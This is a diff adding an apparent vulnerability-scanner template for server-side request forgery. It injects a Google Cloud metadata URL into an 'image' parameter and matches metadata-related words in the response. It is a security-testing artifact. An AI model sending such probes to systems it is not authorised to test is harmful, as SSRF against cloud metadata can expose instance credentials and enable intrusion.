@@ -1,0 +1,22 @@
+id: patt-ssrf-cloud-gcp-01-image
+name: 'PATT ssrf patt-ssrf-cloud-gcp-01 via image'
+severity: high
+type: active
+tags:
+  - ssrf
+  - patt
+  - cloudgcp
+description: 'PATT GCP metadata (butuh header Metadata-Flavor, verifikasi manual). [patt:patt-ssrf-cloud-gcp-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      image:
+        - 'http://metadata.google/computeMetadata/v1/'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'instance'
+          - 'metadata'
+          - 'project'
